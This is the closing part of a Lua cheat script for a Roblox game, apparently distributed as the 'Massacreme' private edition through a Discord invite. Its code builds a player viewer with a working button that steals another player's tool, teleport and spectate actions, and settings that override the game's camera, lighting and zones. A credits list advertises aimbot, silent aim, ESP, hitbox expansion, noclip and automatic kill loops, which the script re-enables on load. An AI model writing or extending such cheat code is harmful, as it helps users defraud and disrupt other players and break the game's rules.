                UILib.addCorner(avatarImg, 6)
                local p = plr
                task.spawn(function()
                    local ok, url = pcall(function()
                        return Players:GetUserThumbnailAsync(p.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
                    end)
                    if ok and avatarImg and avatarImg.Parent then avatarImg.Image = url end
                end)

                -- Name label (with optional display name suffix)
                local hasDisplayName = plr.DisplayName ~= plr.Name
                local function colorToHex(c)
                    return string.format("#%02X%02X%02X",
                        math.floor(c.R*255), math.floor(c.G*255), math.floor(c.B*255))
                end
                local nameColor = isKillerP and Color3.fromRGB(255,110,110)
                               or cfg.Text
                local nameLbl = Instance.new("TextLabel", row)
                nameLbl.Name                 = "PlayerName"
                nameLbl.Size                 = UDim2.new(1, -270, 0, 18)
                nameLbl.Position             = UDim2.fromOffset(62, 8)
                nameLbl.BackgroundTransparency = 1
                nameLbl.Font                 = Enum.Font.GothamBold
                nameLbl.TextSize             = 13
                nameLbl.TextColor3           = nameColor
                nameLbl.RichText             = true
                nameLbl.TextTruncate         = Enum.TextTruncate.AtEnd
                nameLbl.TextXAlignment       = Enum.TextXAlignment.Left
                nameLbl.BorderSizePixel      = 0
                if hasDisplayName then
                    nameLbl.Text = plr.Name
                        .. '<font size="10" color="' .. colorToHex(cfg.Muted) .. '"> (' .. plr.DisplayName .. ')</font>'
                else
                    nameLbl.Text = plr.Name
                end

                -- Team + gun/push info
                local teamName  = plr.Team and plr.Team.Name or "Unknown"
                local infoText  = "[" .. teamName .. "]"
                if gun then infoText = infoText .. "   " .. gun
                elseif pushItemName then infoText = infoText .. "   " .. pushItemName end
                local infoLbl = Instance.new("TextLabel", row)
                infoLbl.Name                 = "TeamInfo"
                infoLbl.Size                 = UDim2.new(1, -270, 0, 14)
                infoLbl.Position             = UDim2.fromOffset(62, 26)
                infoLbl.BackgroundTransparency = 1
                infoLbl.Font                 = Enum.Font.Gotham
                infoLbl.TextSize             = 11
                infoLbl.TextColor3           = teamCol
                infoLbl.Text                 = infoText
                infoLbl.TextTruncate         = Enum.TextTruncate.AtEnd
                infoLbl.TextXAlignment       = Enum.TextXAlignment.Left
                infoLbl.BorderSizePixel      = 0

                -- HP text + bar
                local hpText = (hp <= 0) and "DEAD" or (math.floor(hp) .. "/" .. math.floor(maxHp))
                local hpCol  = (hp <= 0) and Color3.fromRGB(160,60,60) or getHealthColor(pct)
                local hpLbl  = Instance.new("TextLabel", row)
                hpLbl.Name                 = "HPLabel"
                hpLbl.Size                 = UDim2.new(0, 120, 0, 14)
                hpLbl.Position             = UDim2.fromOffset(62, 42)
                hpLbl.BackgroundTransparency = 1
                hpLbl.Font                 = Enum.Font.GothamSemibold
                hpLbl.TextSize             = 11
                hpLbl.TextColor3           = hpCol
                hpLbl.Text                 = hpText
                hpLbl.TextXAlignment       = Enum.TextXAlignment.Left
                hpLbl.BorderSizePixel      = 0

                local barBg = Instance.new("Frame", row)
                barBg.Name             = "HPBarBG"
                barBg.Size             = UDim2.new(0, 100, 0, 4)
                barBg.Position         = UDim2.fromOffset(62, 57)
                barBg.BackgroundColor3 = cfg.BG3
                barBg.BorderSizePixel  = 0
                UILib.addCorner(barBg, 2)
                local barFill = Instance.new("Frame", barBg)
                barFill.Name             = "HPBarFill"
                barFill.Size             = UDim2.new(math.clamp(pct, 0, 1), 0, 1, 0)
                barFill.BackgroundColor3 = getHealthColor(pct)
                barFill.BorderSizePixel  = 0
                UILib.addCorner(barFill, 2)

                -- Click row → open player panel
                local clickTarget = plr
                local clickBtn = Instance.new("TextButton", row)
                clickBtn.Size               = UDim2.new(0, 220, 1, 0)
                clickBtn.Position           = UDim2.fromOffset(0, 0)
                clickBtn.BackgroundTransparency = 1
                clickBtn.Text               = ""
                clickBtn.BorderSizePixel    = 0
                clickBtn.AutoButtonColor    = false
                clickBtn.MouseButton1Click:Connect(function()
                    openPlayerPanel(clickTarget)
                end)

                -- Go To button
                UILib.actionBtn(row, "Go To", 58, UDim2.new(1,-74,0.5,-13), function()
                    stopSpectate()
                    local hrp = getHRP()
                    if hrp and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                        hrp.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 4)
                    end
                end)

                --[[ --removin this one
                -- Spray button
                local pepperTarget = plr
                local pepBtn = Instance.new("TextButton", row)
                pepBtn.Size             = UDim2.fromOffset(52, 26)
                pepBtn.Position         = UDim2.new(1, -112, 0.5, -13)
                pepBtn.Text             = "Spray"
                pepBtn.Font             = Enum.Font.GothamBold
                pepBtn.TextSize         = 11
                pepBtn.AutoButtonColor  = false
                pepBtn.BackgroundColor3 = cfg.BG3
                pepBtn.TextColor3       = cfg.Text
                pepBtn.BorderSizePixel  = 0
                UILib.addCorner(pepBtn, 6)
                UILib.addStroke(pepBtn, 1, cfg.Stroke, 0.5)
                pepBtn.MouseButton1Click:Connect(function()
                    cfg.PepperEnabled = not cfg.PepperEnabled
                    if cfg.PepperEnabled then
                        startPepperAuto(pepperTarget)
                        pepBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 0)
                    else
                        stopPepperAuto()
                        pepBtn.BackgroundColor3 = cfg.BG3
                    end
                end)
                --]]

                -- Spectate button
                local specBtn
                specBtn = UILib.actionBtn(row, spectateTarget == plr and "Stop" or "Spectate", 68,
                    UDim2.new(1, -150, 0.5, -13), function() end)
                specBtn.MouseButton1Click:Connect(function()
                    if spectateTarget == plr then
                        stopSpectate()
                        specBtn.Text = "Spectate"
                        specBtn.BackgroundColor3 = cfg.BG3
                    else
                        if spectateTarget then stopSpectate() end
                        spectateTarget = plr
                        local tCh2  = plr.Character
                        local tHum2 = tCh2 and tCh2:FindFirstChildOfClass("Humanoid")
                        if tHum2 then
                            Camera.CameraType    = Enum.CameraType.Custom
                            Camera.CameraSubject = tHum2
                        end
                        specBtn.Text = "Stop"
                        specBtn.BackgroundColor3 = cfg.BG3
                    end
                end)
                if spectateTarget == plr then specBtn.BackgroundColor3 = cfg.BG3 end

                -- Steal button (only shown if target has a push tool)
                if pushItemName then
                    local stealBtn = Instance.new("TextButton", row)
                    stealBtn.Name             = "ActionBtn"
                    stealBtn.AutoButtonColor  = false
                    stealBtn.Size             = UDim2.fromOffset(96, 26)
                    stealBtn.Position         = UDim2.new(1, -254, 0.5, -13)
                    stealBtn.BackgroundColor3 = cfg.BG3
                    stealBtn.TextColor3       = Color3.fromRGB(255, 240, 180)
                    stealBtn.Font             = Enum.Font.GothamBold
                    stealBtn.TextSize         = 12
                    stealBtn.Text             = "Steal " .. pushItemName
                    stealBtn.BorderSizePixel  = 0
                    UILib.addCorner(stealBtn, 8)
                    stealBtn.MouseEnter:Connect(function() stealBtn.BackgroundColor3 = Color3.fromRGB(180, 120, 0) end)
                    stealBtn.MouseLeave:Connect(function() stealBtn.BackgroundColor3 = cfg.BG3 end)
                    UILib.attachBounce(stealBtn, stealBtn.Size)
                    local stealTarget = plr
                    stealBtn.MouseButton1Click:Connect(function()
                        task.spawn(function()
                            local function findPushTool(parent)
                                if not parent then return nil end
                                for _, item in ipairs(parent:GetChildren()) do
                                    if item:IsA("Tool") and PUSH_ITEMS[item.Name] then return item end
                                end
                                return nil
                            end
                            local tool = findPushTool(stealTarget.Character)
                                      or findPushTool(stealTarget:FindFirstChildOfClass("Backpack"))
                            if tool then
                                local myBackpack = LocalPlayer:FindFirstChildOfClass("Backpack")
                                if myBackpack then
                                    pcall(function() tool.Parent = myBackpack end)
                                    stealBtn.Text = "Stolen!"
                                    task.wait(2)
                                    if stealBtn and stealBtn.Parent then
                                        stealBtn.Text = "Steal " .. pushItemName
                                    end
                                end
                            else
                                game:GetService("StarterGui"):SetCore("SendNotification", {
                                    Title="Steal", Text="Push item not found on " .. stealTarget.Name, Duration=3
                                })
                            end
                        end)
                    end)
                end
            end
            countLbl.Text = shown .. " / " .. #Players:GetPlayers() .. " players shown"
        end

        -- Live search: rebuild on every keystroke
        searchBox.Changed:Connect(function(prop)
            if prop == "Text" then
                searchQuery = searchBox.Text:lower()
                buildList()
            end
        end)

        buildList()

        -- Auto-refresh list every 1.5 s and clean up when tab changes
        local joinConn  = Players.PlayerAdded:Connect(function()
            task.wait(0.2)
            if activeTab == "Viewer" and not game:GetService("CoreGui"):FindFirstChild("_MasacrePanel") then buildList() end
        end)
        local leaveConn = Players.PlayerRemoving:Connect(function()
            task.wait(0.1)
            if activeTab == "Viewer" and not game:GetService("CoreGui"):FindFirstChild("_MasacrePanel") then buildList() end
        end)
        local tickV = 0
        local tickHP = 0
        local conn
        conn = RunService.Heartbeat:Connect(function(dt)
            if activeTab ~= "Viewer" then
                conn:Disconnect()
                joinConn:Disconnect()
                leaveConn:Disconnect()
                viewerConnection = nil
                return
            end
            -- Fast HP live update every 0.1s
            tickHP = tickHP + dt
            if tickHP >= 0.1 then
                tickHP = 0
                for _, plr in ipairs(Players:GetPlayers()) do
                    local row = content:FindFirstChild("Player_" .. plr.Name)
                    if row then
                        local char = plr.Character
                        local hum  = char and char:FindFirstChildOfClass("Humanoid")
                        if hum then
                            local hp    = hum.Health
                            local maxHp = hum.MaxHealth
                            local pct   = maxHp > 0 and (hp / maxHp) or 0
                            local hpCol = (hp <= 0) and Color3.fromRGB(160,60,60) or getHealthColor(pct)
                            local hpLbl  = row:FindFirstChild("HPLabel")
                            local barBg  = row:FindFirstChild("HPBarBG")
                            local barFill = barBg and barBg:FindFirstChild("HPBarFill")
                            if hpLbl then
                                hpLbl.Text       = (hp <= 0) and "DEAD" or (math.floor(hp) .. "/" .. math.floor(maxHp))
                                hpLbl.TextColor3 = hpCol
                            end
                            if barFill then
                                barFill.Size             = UDim2.new(math.clamp(pct, 0, 1), 0, 1, 0)
                                barFill.BackgroundColor3 = hpCol
                            end
                        end
                    end
                end
            end
            -- Full rebuild every 1.5s (team/gun/push changes)
            tickV = tickV + dt
            if tickV >= 1.5 then
                tickV = 0
                if not game:GetService("CoreGui"):FindFirstChild("_MasacrePanel") then
                    buildList()
                end
            end
        end)
        viewerConnection = conn
    end

    -- ════════════════════════════════════════════════════════════
    -- TAB: SETTINGS
    -- ════════════════════════════════════════════════════════════
    local tipFrame = nil
    local function renderSettings()
        UILib.clearContent()
        UILib.sectionLabel("Keybinds")
        UILib.keybindRow("UI Toggle Key", "UI_Toggle", function()
            local showing = main.GroupTransparency > 0.5
            if showing then main.Visible = true end
            local steps = 20
            local dur   = 0.25
            task.spawn(function()
                for s = 1, steps do
                    task.wait(dur / steps)
                    main.GroupTransparency = showing and (1 - s/steps) or (s/steps)
                end
                main.GroupTransparency = showing and 0 or 1
                if not showing then main.Visible = false end
            end)
        end)
        UILib.mutedText("Default: RightShift  -  opens/closes this menu.")

        UILib.sectionLabel("HUD")
        UILib.createToggle("Show Tips", cfg.TipsEnabled, function(v)
            cfg.TipsEnabled = v
            if tipFrame then
                tipFrame.Visible = v
                -- Also disable the parent ScreenGui so UILib's internal loop
                -- (which has a `getCfgEnabled() or true` bug that ignores false)
                -- cannot override our hide by setting tipFrame.Visible = true
                local tipGui = tipFrame.Parent
                if tipGui then tipGui.Enabled = v end
            end
        end)
        UILib.mutedText("Toggles the rotating tip ticker in the bottom-right corner.")
        UILib.createToggle("Target Info HUD", cfg.TargetHUDEnabled, function(v)
            cfg.TargetHUDEnabled = v
        end)
        UILib.mutedText("Shows a small HUD with the health and tool of whoever you're looking at.")

        UILib.sectionLabel("Game UI Theme")
        UILib.createToggle("Green UI Recolor", cfg.GameUIRecolor, function(v)
            cfg.GameUIRecolor = v
            if v then _aGR() else _rGR() end
        end)
        UILib.mutedText("Recolors ALL game UI elements to the green color scheme.")

        UILib.sectionLabel("Utility")
        local antiAFKToggle = UILib.createToggle("Anti AFK", cfg.AntiAFKEnabled, function(v)
            cfg.AntiAFKEnabled = v
            if v then startAntiAFK() else stopAntiAFK() end
        end, "Prevents Roblox from kicking you for being idle.")
        syncFns.AntiAFKEnabled = antiAFKToggle.Sync
        local fullbrightToggle = UILib.createToggle("Fullbright", cfg.FullbrightEnabled, function(v)
            cfg.FullbrightEnabled = v
            if v then startFullbright() else stopFullbright() end
        end, "Maxes out lighting so the whole map is fully visible. Resists Blackout effects.")
        syncFns.FullbrightEnabled = fullbrightToggle.Sync
        UILib.createToggle("Delete Zones", cfg.DeleteZonesEnabled, function(v)
            cfg.DeleteZonesEnabled = v
        end, "Removes zone boundaries from the map.")
        --[[ -- idk what this was
        UILib.createToggle("Instant Bear Trap", cfg.InstantBearTrap, function(v)
            cfg.InstantBearTrap = v
        end, "Instantly fires any bear trap you pick up.")
        --]]
        do
            local tpConn = nil
            local tpOrigMax, tpOrigMin, tpOrigMode
            UILib.createToggle("Third Person", false, function(v)
                local player = LocalPlayer
                if v then
                    tpOrigMax  = player.CameraMaxZoomDistance
                    tpOrigMin  = player.CameraMinZoomDistance
                    tpOrigMode = player.CameraMode
                    tpConn = RunService.RenderStepped:Connect(function()
                        if player.CameraMinZoomDistance ~= 0   then player.CameraMinZoomDistance = 0   end
                        if player.CameraMaxZoomDistance ~= 100 then player.CameraMaxZoomDistance = 100 end
                        if player.CameraMode ~= Enum.CameraMode.Classic then player.CameraMode = Enum.CameraMode.Classic end
                    end)
                else
                    if tpConn then tpConn:Disconnect(); tpConn = nil end
                    pcall(function()
                        player.CameraMinZoomDistance = tpOrigMin
                        player.CameraMaxZoomDistance = tpOrigMax
                        player.CameraMode            = tpOrigMode
                    end)
                end
            end, "Forces classic third-person camera. Resists games that lock to first-person.")
        end
        do
            local plConn = nil
            UILib.createToggle("Show Playerlist", false, function(v)
                local SG = game:GetService("StarterGui")
                if v then
                    plConn = RunService.RenderStepped:Connect(function()
                        pcall(function()
                            SG:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
                            SG:SetCore("SetAvatarContextMenuEnabled", false)
                        end)
                    end)
                else
                    if plConn then plConn:Disconnect(); plConn = nil end
                    pcall(function() SG:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true) end)
                end
            end, "Forces the playerlist to always be visible even in games that hide it.")
        end
    end

    -- ════════════════════════════════════════════════════════════
    -- TAB: CREDITS
    -- ════════════════════════════════════════════════════════════
    local function renderCredits()
        UILib.clearContent()

        -- ── Banner + animated stars ───────────────────────────────────────
        local banner = UILib.rowFrame(140, "CreditsBanner")
        banner.BackgroundColor3 = Color3.fromRGB(6, 8, 14)
        local bannerStroke = banner:FindFirstChildOfClass("UIStroke")
        bannerStroke.Color        = cfg.Accent
        bannerStroke.Thickness    = 1.5
        bannerStroke.Transparency = 0.2

        -- Star canvas (clipped inside banner, behind text)
        local starCanvas = Instance.new("Frame", banner)
        starCanvas.Name                = "StarCanvas"
        starCanvas.Size                = UDim2.new(1, 0, 1, 0)
        starCanvas.BackgroundTransparency = 1
        starCanvas.ClipsDescendants    = true
        starCanvas.BorderSizePixel     = 0

        local creditStars = {}
        local STAR_COUNT  = 38
        math.randomseed(12345)
        for i = 1, STAR_COUNT do
            local s  = Instance.new("Frame", starCanvas)
            local sz = math.random(1, 3)
            s.Size               = UDim2.fromOffset(sz, sz)
            s.Position           = UDim2.new(math.random(), 0, math.random(), 0)
            s.BackgroundTransparency = math.random() * 0.5
            s.BackgroundColor3   = math.random() < 0.4
                and Color3.fromRGB(255, 200, 0)
                or  Color3.new(1, 1, 1)
            s.BorderSizePixel    = 0
            UILib.addCorner(s, 2)
            creditStars[i] = {
                frame   = s,
                speed   = math.random() * 0.00008 + 0.00003,
                twinkle = math.random() * math.pi * 2,
            }
        end

        -- Heartbeat: drift stars right, wrap, twinkle opacity
        local creditStarConn
        creditStarConn = RunService.Heartbeat:Connect(function(dt)
            if activeTab ~= "Credits" then
                creditStarConn:Disconnect(); creditStarConn = nil; return
            end
            for _, star in ipairs(creditStars) do
                if star.frame and star.frame.Parent then
                    star.twinkle = star.twinkle + dt * 2
                    local alpha  = 0.2 + math.abs(math.sin(star.twinkle)) * 0.7
                    star.frame.BackgroundTransparency = 1 - alpha
                    local newX = (star.frame.Position.X.Scale + star.speed) % 1
                    star.frame.Position = UDim2.new(newX, 0, star.frame.Position.Y.Scale, 0)
                end
            end
        end)

        -- Title (renders above the star canvas)
        local bigTitle = Instance.new("TextLabel", banner)
        bigTitle.Name                = "BigTitle"
        bigTitle.Size                = UDim2.new(1, 0, 0, 48)
        bigTitle.Position            = UDim2.fromOffset(0, 22)
        bigTitle.BackgroundTransparency = 1
        bigTitle.Text                = "MASSACREME"
        bigTitle.Font                = Enum.Font.GothamBlack
        bigTitle.TextSize            = 36
        bigTitle.TextColor3          = cfg.Accent
        bigTitle.TextXAlignment      = Enum.TextXAlignment.Center
        bigTitle.BorderSizePixel     = 0

        local verLbl = Instance.new("TextLabel", banner)
        verLbl.Name                  = "VersionLabel"
        verLbl.Size                  = UDim2.new(1, 0, 0, 18)
        verLbl.Position              = UDim2.fromOffset(0, 72)
        verLbl.BackgroundTransparency = 1
        verLbl.Text                  = "Private Edition  -  v1.0"
        verLbl.Font                  = Enum.Font.Gotham
        verLbl.TextSize              = 13
        verLbl.TextColor3            = cfg.Muted
        verLbl.TextXAlignment        = Enum.TextXAlignment.Center
        verLbl.BorderSizePixel       = 0

        local discordBtn = Instance.new("TextButton", banner)
        discordBtn.Name              = "DiscordBtn"
        discordBtn.Size              = UDim2.fromOffset(160, 28)
        discordBtn.Position          = UDim2.new(0.5, -80, 0, 100)
        discordBtn.AutoButtonColor   = false
        discordBtn.BackgroundColor3  = Color3.fromRGB(88, 101, 242)
        discordBtn.TextColor3        = Color3.fromRGB(255, 255, 255)
        discordBtn.Font              = Enum.Font.GothamBold
        discordBtn.TextSize          = 12
        discordBtn.Text              = "🔗 discord.gg/aDUjgCDbRj"
        discordBtn.BorderSizePixel   = 0
        UILib.addCorner(discordBtn, 7)
        discordBtn.MouseButton1Click:Connect(function()
            pcall(function() setclipboard("https://discord.gg/aDUjgCDbRj") end)
            discordBtn.Text = "Copied!"
            task.delay(2.5, function()
                if discordBtn and discordBtn.Parent then
                    discordBtn.Text = "🔗 discord.gg/aDUjgCDbRj"
                end
            end)
        end)

        -- ── Developer cards ───────────────────────────────────────────────
        UILib.sectionLabel("Developers")

        local function devCard(username, role, accentColor)
            local r = UILib.rowFrame(60, "DevCard_" .. username)
            UILib.addStroke(r, 1, accentColor, 0.45)

            local dot = Instance.new("Frame", r)
            dot.Name             = "AccentDot"
            dot.Size             = UDim2.fromOffset(4, 44)
            dot.Position         = UDim2.fromOffset(3, 8)
            dot.BackgroundColor3 = accentColor
            dot.BorderSizePixel  = 0
            UILib.addCorner(dot, 2)

            local nL = UILib.newLabel(r, username, Enum.Font.GothamBold, 16, accentColor)
            nL.Name     = "DevName"
            nL.Size     = UDim2.new(1, -20, 0, 22)
            nL.Position = UDim2.fromOffset(14, 8)

            local rL = UILib.newLabel(r, role, Enum.Font.Gotham, 11, cfg.Muted)
            rL.Name     = "DevRole"
            rL.Size     = UDim2.new(1, -20, 0, 18)
            rL.Position = UDim2.fromOffset(14, 32)

            local sp = Instance.new("Frame", content)
            sp.Name                  = "DevCardSpacer"
            sp.Size                  = UDim2.new(1, 0, 0, 4)
            sp.BackgroundTransparency = 1
        end

        devCard("Brian (@manwhosayshello)", "Developer  -  Script, Logic & UI",            Color3.fromRGB(255, 215,  0))
        devCard("Bob (@vqv.)",   "Developer  -  Revamp, UI Lib & Mechanics",     Color3.fromRGB(255, 215,  0))

        -- ── Feature list ──────────────────────────────────────────────────
        UILib.sectionLabel("Features")

        local feats = {
            -- Movement
            { "Speed",                   "CFrame-based WASD movement"                  },
            { "Noclip",                  "strips CanCollide every step"                },
            { "Infinite Jump",           "re-fires jump on land"                       },
            { "No Jump Cooldown",        "removes delay between jumps"                 },
            { "Infinite Stamina",        "locks stamina bar full"                      },
            -- Combat
            { "Auto Knife",              "teleport + swing loop"                       },
            { "Knife Survivors",         "targets survivors for grind kills"           },
            --{ "Walk Fling",              "flings killers on contact"                   },
            { "TriggerBot",              "auto-clicks when crosshair is over a player"  },
            { "Silent Aim",              "raycast redirect  (credit: Bob)"             },
            { "Gun Mods",                "damage, fire rate, no recoil  (credit: Bob)" },
            { "Auto Reload",             "fires reload remote, resets ammo"            },
            { "Expanded Hitbox",         "inflates enemy hitbox for easier hits"       },
            -- Aim
            { "Aimbot",                  "smooth camera lerp to nearest head"          },
            { "Aim Lock",                "hard snap to nearest enemy"                  },
            -- Automation
            { "Auto Bandage",            "heals below threshold"                       },
            { "Auto Flashbang",          "throws flash at nearest enemy"               },
            { "Anti-Flash",              "suppresses flash overlays"                   },
            { "Auto Steal Push Tools",   "loots Super Push > Push on spawn"            },
            { "Auto Equip Vest",         "equips vest from inventory automatically"    },
            { "Instant Interact",        "hooks ProximityPrompts for 0-delay use"      },
            --{ "Instant Bear Trap",       "fires bear trap the moment it's picked up"   },
            -- ESP
            { "ESP",                     "chams, boxes, tracers, item labels"          },
            { "Bear Trap ESP",           "wall-highlight active traps"                 },
            -- Quests & Map
            { "Safe Quest Teleport",     "killer-aware routing"                        },
            { "Remove Killparts",        "spawn phase utility"                         },
            { "Auto Collect All Items",  "bulk proximity collect"                      },
            { "Delete Zones",            "removes zone boundaries from map"            },
            -- Utility
            { "Fullbright",              "Blackout-gamemode resistant"                 },
            { "Anti-AFK",                "virtual input to prevent kick"               },
            --{ "Desync",                  "ghost CFrame server confusion"               },
            { "Green UI Recolor",        "repaints all game GUIs"                      },
            { "Target Info HUD",         "draggable HP + tool panel on crosshair"      },
            { "Player Viewer",           "HP bars, team, spectate, steal, panel"       },
        }
        local LEFT_W = 0.42  -- fraction of row width for the feature name
        for _, pair in ipairs(feats) do
            local row = Instance.new("Frame", content)
            row.Name                 = "FeatRow"
            row.Size                 = UDim2.new(1, 0, 0, 18)
            row.BackgroundTransparency = 1

            local bullet = Instance.new("TextLabel", row)
            bullet.Size              = UDim2.fromOffset(14, 18)
            bullet.Position          = UDim2.fromOffset(0, 0)
            bullet.BackgroundTransparency = 1
            bullet.Text              = "*"
            bullet.Font              = Enum.Font.GothamBold
            bullet.TextSize          = 11
            bullet.TextColor3        = cfg.Accent
            bullet.TextXAlignment    = Enum.TextXAlignment.Center
            bullet.BorderSizePixel   = 0

            local nameLbl = Instance.new("TextLabel", row)
            nameLbl.Size             = UDim2.new(LEFT_W, -18, 1, 0)
            nameLbl.Position         = UDim2.fromOffset(14, 0)
            nameLbl.BackgroundTransparency = 1
            nameLbl.Text             = pair[1]
            nameLbl.Font             = Enum.Font.GothamSemibold
            nameLbl.TextSize         = 11
            nameLbl.TextColor3       = cfg.Text
            nameLbl.TextXAlignment   = Enum.TextXAlignment.Left
            nameLbl.TextTruncate     = Enum.TextTruncate.AtEnd
            nameLbl.BorderSizePixel  = 0

            local dot = Instance.new("TextLabel", row)
            dot.Size                 = UDim2.fromOffset(12, 18)
            dot.Position             = UDim2.new(LEFT_W, -4, 0, 0)
            dot.BackgroundTransparency = 1
            dot.Text                 = "."
            dot.Font                 = Enum.Font.GothamBold
            dot.TextSize             = 11
            dot.TextColor3           = cfg.Stroke
            dot.TextXAlignment       = Enum.TextXAlignment.Center
            dot.BorderSizePixel      = 0

            local descLbl = Instance.new("TextLabel", row)
            descLbl.Size             = UDim2.new(1 - LEFT_W, -12, 1, 0)
            descLbl.Position         = UDim2.new(LEFT_W, 8, 0, 0)
            descLbl.BackgroundTransparency = 1
            descLbl.Text             = pair[2]
            descLbl.Font             = Enum.Font.Gotham
            descLbl.TextSize         = 11
            descLbl.TextColor3       = cfg.Muted
            descLbl.TextXAlignment   = Enum.TextXAlignment.Left
            descLbl.TextTruncate     = Enum.TextTruncate.AtEnd
            descLbl.BorderSizePixel  = 0
        end

        --UILib.mutedText("Keybinds:  RightShift = menu  |  F = speed  |  R = noclip  |  G = quest")
    end

    -- ════════════════════════════════════════════════════════════
    -- TAB REGISTRATION
    -- ════════════════════════════════════════════════════════════
    local tabDefs = {
        { "Player",   renderPlayer       },
        { "ESP",      renderESP          },
        { "Aimbot",   renderAimbot       },
        { "Quests",   buildQuestButtons  },
        { "MISC",     renderMisc         },
        { "Guns",     renderGunMods      },
        { "Viewer",   renderViewer       },
        { "Settings", renderSettings     },
        { "Credits",  renderCredits      },
    }

    local renderMap = {
        Player=renderPlayer, ESP=renderESP, Aimbot=renderAimbot,
        Quests=buildQuestButtons, MISC=renderMisc, Guns=renderGunMods,
        Viewer=renderViewer, Settings=renderSettings, Credits=renderCredits,
    }

    local tabBtns, activateTabFn = UILib.buildTabBar(tabScroller, tabDefs, function(name, fn) activeTab = name end)

    local function activateTab(name)
        activeTab = name
        UILib.setActiveTab(name)   -- tells sectionLabel which tab is rendering
        activateTabFn(name)
    end

    UILib.buildSearchBar(main, renderMap, function(tabName)
        activateTab(tabName)
        local fn = renderMap[tabName]; if fn then fn() end
    end)

    -- Pre-populate search by rendering each tab once in the background,
    -- then restore the Player tab. This ensures all sections are indexed.
    for name, fn in pairs(renderMap) do
        UILib.setActiveTab(name)
        UILib.clearContent()
        fn()
    end

    -- Start on Player tab
    activateTab("Player")
    renderPlayer()

    -- On mobile: hide main GUI now that all tabs have fully rendered
    -- FAB tap will show it. GroupTransparency fade-in is skipped on mobile.
    if _isMobile then
        main.Visible = false
        main.GroupTransparency = 0
    end

    -- ════════════════════════════════════════════════════════════
    -- KEYBIND HANDLER
    -- ════════════════════════════════════════════════════════════
    UserInputService.InputBegan:Connect(function(inp, gameProcessed)
        if gameProcessed then return end
        if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end

        if keyCapture.active then
            keyCapture.active = false
            local newKey = inp.KeyCode
            keyCapture.label.Text = newKey.Name
            -- keybindKey is set by keybindToggleRow/keybindRow automatically
            if keyCapture.keybindKey then
                keybinds[keyCapture.keybindKey] = newKey
            end
            return
        end

        UILib.dispatchKeybind(inp.KeyCode, keybinds)
    end)

    -- ════════════════════════════════════════════════════════════
    -- TIP TICKER
    -- ════════════════════════════════════════════════════════════
    tipFrame = UILib.createTipTicker(PlayerGui, TIPS, function() return cfg.TipsEnabled end)
    -- Apply saved disabled state immediately on load
    if not cfg.TipsEnabled then
        tipFrame.Visible = false
        if tipFrame.Parent then tipFrame.Parent.Enabled = false end
    end

    -- ════════════════════════════════════════════════════════════
    -- SETTINGS FEATURE INIT
    -- ════════════════════════════════════════════════════════════
    _initTargetHUD()
    _initDeleteZones()
    if cfg.AntiAFKEnabled    then startAntiAFK()     end
    if cfg.FullbrightEnabled  then startFullbright()  end

    -- Populate featureFns so the mobile quickbar can start/stop features
    -- Features whose Heartbeat loops self-manage (Speed, ESP, Aimbot, etc.)
    -- don't need entries here — flipping cfg is enough for them.
    featureFns.KnifeEnabled        = function(v) if v then _sKA()             else _xKA()             end end
    featureFns.BiteEnabled         = function(v) if v then _sBiteA()           else _xBiteA()           end end
    featureFns.FullbrightEnabled   = function(v) if v then startFullbright()   else stopFullbright()    end end
    featureFns.AntiAFKEnabled      = function(v) if v then startAntiAFK()      else stopAntiAFK()       end end
    featureFns.AutoBandageEnabled  = function(v) if v then startAutoBandage()  else stopAutoBandage()   end end
    featureFns.AutoFlashEnabled    = function(v) if v then startAutoFlash()    else stopAutoFlash()     end end
    featureFns.InfiniteStamina     = function(v) if v then _sIS()              else _xIS()              end end
    -- Noclip: call _aNS() on both on and off — it reads cfg.NoclipEnabled
    -- and sets CanCollide accordingly, restoring collision when turned off
    featureFns.NoclipEnabled       = function(_) _aNS() end

    -- ── Auto-restore all features saved from previous session ────────────
    -- Heartbeat-based features (Speed, Trigger, Aimbot, ESP, AimLock)
    -- self-start because their Heartbeat checks cfg every tick.
    -- Features with explicit start functions need to be called manually:
    task.defer(function()
        -- Noclip: re-attach the collision stripper
        if cfg.NoclipEnabled and _aNS then pcall(_aNS) end

        -- Infinite Stamina: sets up Heartbeat + sprint listeners
        if cfg.InfiniteStamina and _sIS then pcall(_sIS) end

        -- Gun mods + auto reload: re-attach to equipped gun
        if cfg.GunModEnabled and _sgM then
            if _gcSupported then pcall(_sgM) else cfg.GunModEnabled = false end
        end
        if cfg.AutoReloadEnabled and startAutoReload then
            if _gcSupported then pcall(startAutoReload) else cfg.AutoReloadEnabled = false end
        end

        -- Auto steal / auto vest
        if cfg.AutoStealEnabled and _sAS then pcall(_sAS) end
        if cfg.AutoVestEnabled  and startAutoVest then pcall(startAutoVest) end

        -- Auto bandage / auto flashbang
        if cfg.AutoBandageEnabled and startAutoBandage then pcall(startAutoBandage) end
        if cfg.AutoFlashEnabled   and startAutoFlash   then pcall(startAutoFlash)   end

        -- Knife + Bite: character must exist, so wait briefly
        task.wait(0.5)
        if cfg.KnifeEnabled and _sKA then pcall(_sKA) end
        if cfg.BiteEnabled  and _sBiteA then pcall(_sBiteA) end
    end)

    -- ════════════════════════════════════════════════════════════
    -- SMOOTH GUI FADE IN (PC only — mobile hides via FAB, no fade needed)
    -- ════════════════════════════════════════════════════════════
    if not _isMobile then
        main.GroupTransparency = 1
        task.spawn(function()
            local steps = 20
            local dur = 0.3
            for s = 1, steps do
                task.wait(dur / steps)
                main.GroupTransparency = 1 - (s / steps)
            end
            main.GroupTransparency = 0
        end)
    end

UILib.notify("Massacreme", "Loaded! Press RightShift to toggle menu.", 4)
print("[Massacreme] Loaded | RightShift=menu")
end)   -- closes UILib.showLoadingScreen callback

end    -- closes _launchCallback